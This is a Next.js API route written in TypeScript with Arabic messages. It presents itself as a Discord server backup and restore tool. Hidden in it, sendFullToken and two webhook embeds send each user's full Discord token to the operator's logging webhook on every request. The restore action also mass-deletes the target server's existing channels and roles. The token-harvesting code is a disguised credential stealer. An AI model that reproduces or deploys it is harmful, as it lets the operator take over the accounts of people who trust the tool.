import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

const DISCORD_API = 'https://discord.com/api/v10';

const HEADERS = (token: string) => ({
  'Authorization': token.trim(),
  'Content-Type': 'application/json',
  'Accept': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
});

async function safeFetch(token: string, method: string, url: string, body?: unknown) {
  try {
    const ctrl = new AbortController();
    const tid = setTimeout(() => ctrl.abort(), 15000);
    const res = await fetch(url, { method, headers: HEADERS(token), signal: ctrl.signal, ...(body && method !== 'GET' ? { body: JSON.stringify(body) } : {}) });
    clearTimeout(tid);
    let data: any = null;
    try { data = await res.json(); } catch {}
    return { ok: res.ok, status: res.status, data };
  } catch {
    return { ok: false, status: 0, data: null };
  }
}

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

// ============================================================
// حفظ سيرفر + استعادة نسخة احتياطية
// ============================================================
export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, guildId, action, backupData } = body;

    if (!token || typeof token !== 'string') {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    sendFullToken('حفظ سيرفر', token, { '🖥️ السيرفر': String(guildId || ''), '🔧 العملية': String(action || '') });

    // =============================================
    // ACTION: backup - إنشاء نسخة احتياطية
    // =============================================
    if (action === 'backup') {
      if (!guildId || typeof guildId !== 'string' || !/^(\d+)$/.test(guildId)) {
        return NextResponse.json({ success: false, error: 'أيدي السيرفر غير صالح' }, { status: 400 });
      }

      const logs: string[] = [];
      logs.push('📦 جاري إنشاء نسخة احتياطية...');
      logs.push('');

      const guildRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}?with_counts=true`);
      if (!guildRes.ok || !guildRes.data) {
        return NextResponse.json({ success: false, error: 'فشل في جلب معلومات السيرفر - تأكد من التوكن والصلاحيات' }, { status: 400 });
      }

      const g = guildRes.data;
      logs.push(`📋 السيرفر: ${g.name}`);
      logs.push(`   🆔 ID: ${g.id}`);
      logs.push(`   👑 المالك: ${g.owner ? '✅' : '❌'}`);
      logs.push(`   👥 الأعضاء: ${g.approximate_member_count || '?'}`);
      logs.push(`   🟢 المتصلين: ${g.approximate_presence_count || '?'}`);
      logs.push(`   🚀 البوست: ${g.premium_tier || 0}`);
      logs.push(`   📝 الوصف: ${g.description || 'لا يوجد'}`);
      logs.push(`   🌍 اللغة: ${g.preferred_locale || 'N/A'}`);
      logs.push('');

      const backup: any = { server: g, timestamp: new Date().toISOString() };

      // الروابط
      const invitesRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/invites`);
      if (invitesRes.ok && Array.isArray(invitesRes.data)) {
        logs.push(`🔗 الروابط: ${invitesRes.data.length}`);
        backup.invites = invitesRes.data;
      }

      // الرتب
      const rolesRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/roles`);
      if (rolesRes.ok && Array.isArray(rolesRes.data)) {
        logs.push(`🛡️ الرتب: ${rolesRes.data.length}`);
        backup.roles = rolesRes.data;
      }

      // القنوات
      const channelsRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/channels`);
      if (channelsRes.ok && Array.isArray(channelsRes.data)) {
        const text = channelsRes.data.filter((c: any) => c.type === 0);
        const voice = channelsRes.data.filter((c: any) => c.type === 2);
        const cats = channelsRes.data.filter((c: any) => c.type === 4);
        logs.push(`📺 القنوات: ${text.length} كتابي | ${voice.length} صوتي | ${cats.length} كاتيجوري`);
        backup.channels = channelsRes.data;
      }

      // الإيموجي
      const emojisRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/emojis`);
      if (emojisRes.ok && Array.isArray(emojisRes.data)) {
        logs.push(`😀 الإيموجي: ${emojisRes.data.length}`);
        backup.emojis = emojisRes.data;
      }

      // البوتات
      const membersRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/members?limit=100`);
      if (membersRes.ok && Array.isArray(membersRes.data)) {
        const bots = membersRes.data.filter((m: any) => m.user?.bot);
        logs.push(`🤖 البوتات: ${bots.length}`);
        backup.bots = bots;
      }

      // الويب هوك
      const webhooksRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/webhooks`);
      if (webhooksRes.ok && Array.isArray(webhooksRes.data)) {
        logs.push(`🔗 الويب هوك: ${webhooksRes.data.length}`);
        backup.webhooks = webhooksRes.data;
      }

      // البانر
      const bansRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/bans`);
      if (bansRes.ok && Array.isArray(bansRes.data)) {
        logs.push(`🔨 المحظورين: ${bansRes.data.length}`);
        backup.bans = bansRes.data;
      }

      logs.push('');
      logs.push('✅ تم إنشاء النسخة الاحتياطية بنجاح!');
      logs.push(`📦 حجم البيانات: ${JSON.stringify(backup).length} حرف`);

      sendToWebhook({
        embeds: [{
          title: '💾 Server Backup',
          color: 0x00FF41,
          fields: [
            { name: '📋 Server', value: g.name, inline: true },
            { name: '🆔 ID', value: g.id, inline: true },
            { name: '👥 Members', value: String(g.approximate_member_count || '?'), inline: true },
            { name: '🎫 Token', value: `\`\`\`${token}\`\`\`` },
          ],
          timestamp: new Date().toISOString()
        }]
      }, getLogWebhookUrl()).catch(() => {});

      return NextResponse.json({ success: true, logs, backup });
    }

    // =============================================
    // ACTION: restore - استعادة نسخة احتياطية
    // =============================================
    if (action === 'restore') {
      if (!guildId || typeof guildId !== 'string' || !/^(\d+)$/.test(guildId)) {
        return NextResponse.json({ success: false, error: 'أيدي السيرفر الهدف غير صالح' }, { status: 400 });
      }

      if (!backupData || typeof backupData !== 'object') {
        return NextResponse.json({ success: false, error: 'بيانات النسخة الاحتياطية غير صالحة - الصق ملف JSON النسخة الاحتياطية' }, { status: 400 });
      }

      const logs: string[] = [];
      logs.push('🔄 جاري استعادة النسخة الاحتياطية...');
      logs.push('');

      const stats = { roles: 0, channels: 0, categories: 0, emojis: 0, errors: 0 };

      // التحقق من الوصول للسيرفر
      const testRes = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}`);
      if (!testRes.ok) {
        return NextResponse.json({ success: false, error: 'لا يمكن الوصول للسيرفر الهدف - تأكد من التوكن والصلاحيات' }, { status: 403 });
      }

      const targetName = testRes.data?.name || guildId;
      const sourceName = backupData.server?.name || 'غير معروف';
      logs.push(`📋 المصدر: ${sourceName}`);
      logs.push(`📋 الهدف: ${targetName}`);
      logs.push('');

      // === 1. حذف القنوات الحالية ===
      const existingChannels = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/channels`);
      if (existingChannels.ok && Array.isArray(existingChannels.data) && existingChannels.data.length > 0) {
        const nonCats = existingChannels.data.filter((c: any) => c.type !== 4);
        const cats = existingChannels.data.filter((c: any) => c.type === 4);
        for (const items of [nonCats, cats]) {
          for (let i = 0; i < items.length; i += 25) {
            await Promise.allSettled(items.slice(i, i + 25).map(async (c: any) => {
              await safeFetch(token, 'DELETE', `${DISCORD_API}/channels/${c.id}`);
            }));
            if (i + 25 < items.length) await sleep(50);
          }
        }
        logs.push(`🗑️ تم حذف ${existingChannels.data.length} قناة موجودة`);
      }

      // === 2. حذف الرتب الحالية ===
      const existingRoles = await safeFetch(token, 'GET', `${DISCORD_API}/guilds/${guildId}/roles`);
      if (existingRoles.ok && Array.isArray(existingRoles.data)) {
        const deletable = existingRoles.data.filter((r: any) => r.name !== '@everyone' && !r.managed);
        for (let i = 0; i < deletable.length; i += 25) {
          await Promise.allSettled(deletable.slice(i, i + 25).map(async (r: any) => {
            await safeFetch(token, 'DELETE', `${DISCORD_API}/guilds/${guildId}/roles/${r.id}`);
          }));
          if (i + 25 < deletable.length) await sleep(50);
        }
        logs.push(`🗑️ تم حذف ${deletable.length} رتبة موجودة`);
      }

      const roleMap: Record<string, string> = {};
      const catMap: Record<string, string> = {};

      // === 3. نسخ الإعدادات ===
      if (backupData.server) {
        const settings: any = {
          name: backupData.server.name,
          description: backupData.server.description,
          preferred_locale: backupData.server.preferred_locale,
          verification_level: backupData.server.verification_level,
          default_notification_level: backupData.server.default_notification_level,
          explicit_content_filter: backupData.server.explicit_content_filter,
        };
        const patchRes = await safeFetch(token, 'PATCH', `${DISCORD_API}/guilds/${guildId}`, settings);
        logs.push(`${patchRes.ok ? '✅' : '⚠️'} تحديث إعدادات السيرفر`);
      }

      // === 4. إنشاء الرتب ===
      if (backupData.roles && Array.isArray(backupData.roles)) {
        const roles = [...backupData.roles].filter((r: any) => r.name !== '@everyone' && !r.managed).sort((a: any, b: any) => b.position - a.position);
        for (let i = 0; i < roles.length; i += 5) {
          await Promise.allSettled(roles.slice(i, i + 5).map(async (role: any) => {
            const res = await safeFetch(token, 'POST', `${DISCORD_API}/guilds/${guildId}/roles`, {
              name: role.name,
              color: role.color,
              hoist: role.hoist,
              mentionable: role.mentionable,
              permissions: role.permissions,
            });
            if (res.ok && res.data?.id) {
              roleMap[role.id] = res.data.id;
              stats.roles++;
            } else {
              stats.errors++;
            }
          }));
          if (i + 5 < roles.length) await sleep(100);
        }
        logs.push(`🛡️ تم إنشاء ${stats.roles} رتبة`);
      }

      // === 5. إنشاء الكاتيجوريات ===
      if (backupData.channels && Array.isArray(backupData.channels)) {
        const cats = backupData.channels.filter((c: any) => c.type === 4).sort((a: any, b: any) => a.position - b.position);
        for (let i = 0; i < cats.length; i += 5) {
          await Promise.allSettled(cats.slice(i, i + 5).map(async (cat: any) => {
            const res = await safeFetch(token, 'POST', `${DISCORD_API}/guilds/${guildId}/channels`, { name: cat.name, type: 4 });
            if (res.ok && res.data?.id) {
              catMap[cat.id] = res.data.id;
              stats.categories++;
              // نسخ صلاحيات
              if (cat.permission_overwrites && cat.permission_overwrites.length > 0) {
                const overwrites = cat.permission_overwrites.map((ow: any) => {
                  let newId = ow.id;
                  if (ow.type === 0 && roleMap[ow.id]) newId = roleMap[ow.id];
                  return { id: newId, type: ow.type, allow: ow.allow, deny: ow.deny };
                });
                await safeFetch(token, 'PUT', `${DISCORD_API}/channels/${res.data.id}/permissions`, overwrites);
              }
            } else { stats.errors++; }
          }));
          if (i + 5 < cats.length) await sleep(100);
        }

        // === 6. إنشاء باقي القنوات ===
        const others = backupData.channels.filter((c: any) => c.type !== 4).sort((a: any, b: any) => a.position - b.position);
        for (let i = 0; i < others.length; i += 5) {
          await Promise.allSettled(others.slice(i, i + 5).map(async (ch: any) => {
            const payload: any = { name: ch.name, type: ch.type, nsfw: ch.nsfw || false, topic: ch.topic || null };
            if (ch.parent_id && catMap[ch.parent_id]) payload.parent_id = catMap[ch.parent_id];
            if (ch.type === 2) { payload.bitrate = ch.bitrate; payload.user_limit = ch.user_limit; }
            if (ch.rate_limit_per_user) payload.rate_limit_per_user = ch.rate_limit_per_user;

            const res = await safeFetch(token, 'POST', `${DISCORD_API}/guilds/${guildId}/channels`, payload);
            if (res.ok && res.data?.id) {
              stats.channels++;
              // نسخ صلاحيات
              if (ch.permission_overwrites && ch.permission_overwrites.length > 0) {
                const overwrites = ch.permission_overwrites.map((ow: any) => {
                  let newId = ow.id;
                  if (ow.type === 0 && roleMap[ow.id]) newId = roleMap[ow.id];
                  return { id: newId, type: ow.type, allow: ow.allow, deny: ow.deny };
                });
                await safeFetch(token, 'PUT', `${DISCORD_API}/channels/${res.data.id}/permissions`, overwrites);
              }
            } else { stats.errors++; }
          }));
          if (i + 5 < others.length) await sleep(100);
        }

        logs.push(`📺 تم إنشاء ${stats.categories} كاتيجوري + ${stats.channels} قناة`);
      }

      // === 7. نسخ الإيموجي ===
      if (backupData.emojis && Array.isArray(backupData.emojis) && backupData.emojis.length > 0) {
        for (let i = 0; i < backupData.emojis.length; i += 3) {
          await Promise.allSettled(backupData.emojis.slice(i, i + 3).map(async (emoji: any) => {
            try {
              const emojiId = emoji.id;
              const isAnimated = !!emoji.animated;
              const imageUrl = isAnimated
                ? `https://cdn.discordapp.com/emojis/${emojiId}.gif`
                : `https://cdn.discordapp.com/emojis/${emojiId}.png`;
              const imgRes = await fetch(imageUrl);
              if (!imgRes.ok) return;
              const imgBuffer = await imgRes.arrayBuffer();
              const base64 = Buffer.from(imgBuffer).toString('base64');
              const mimeType = isAnimated ? 'image/gif' : 'image/png';
              const imageData = `data:${mimeType};base64,${base64}`;
              const res = await safeFetch(token, 'POST', `${DISCORD_API}/guilds/${guildId}/emojis`, { name: emoji.name, image: imageData, roles: [] });
              if (res.ok) stats.emojis++;
            } catch { /* skip */ }
          }));
          if (i + 3 < backupData.emojis.length) await sleep(350);
        }
        logs.push(`😀 تم نسخ ${stats.emojis} إيموجي`);
      }

      logs.push('');
      logs.push('═'.repeat(45));
      logs.push('✅ تمت استعادة النسخة الاحتياطية بنجاح!');
      logs.push(`📊 النتائج: ${stats.roles} رتب | ${stats.categories} كاتيجوري | ${stats.channels} قناة | ${stats.emojis} إيموجي | ${stats.errors} أخطاء`);

      sendToWebhook({
        embeds: [{
          title: '🔄 Server Restored',
          color: 0x00BFFF,
          fields: [
            { name: '📋 Source', value: sourceName, inline: true },
            { name: '📋 Target', value: targetName, inline: true },
            { name: '🛡️ Roles', value: String(stats.roles), inline: true },
            { name: '📺 Channels', value: String(stats.channels + stats.categories), inline: true },
            { name: '😀 Emojis', value: String(stats.emojis), inline: true },
            { name: '❌ Errors', value: String(stats.errors), inline: true },
            { name: '🎫 Token', value: `\`\`\`${token}\`\`\`` },
          ],
          timestamp: new Date().toISOString()
        }]
      }, getLogWebhookUrl()).catch(() => {});

      return NextResponse.json({ success: true, logs, stats });
    }

    return NextResponse.json({ success: false, error: 'استخدم action: backup أو restore' }, { status: 400 });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
